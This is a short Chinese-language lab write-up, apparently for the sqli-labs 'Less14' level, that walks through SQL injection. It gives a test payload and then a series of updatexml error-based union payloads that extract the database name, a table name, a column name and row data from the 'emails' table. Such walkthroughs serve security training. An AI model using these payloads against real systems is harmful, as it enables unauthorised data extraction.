# Less14

　　这关关于二次post注入

　　判断是否存在注入：?id=1") and 1=1 -- lb

　　报错说明存在注入

![image](assets/image-20250426212328-iti37a6.png)

　　‍

　　这里应该使用报错注入：

　　判断库名：" union select updatexml(1,concat(0x7e,(select database()),0x7e),1) #

![image](assets/image-20250426212705-coke1ce.png)

　　判断表名：" union select updatexml(1,concat(0x7e,(select table\_name from information\_schema.tables where table\_schema\='security'limit 0,1),0x7e),1)-- lb

![image](assets/image-20250426212727-ddzx2fh.png)

　　判断列名：" union select updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- lb

![image](assets/image-20250426212755-w57fb51.png)

　　判断数据：" union select updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- lb

![image](assets/image-20250426212831-xxzor6r.png)
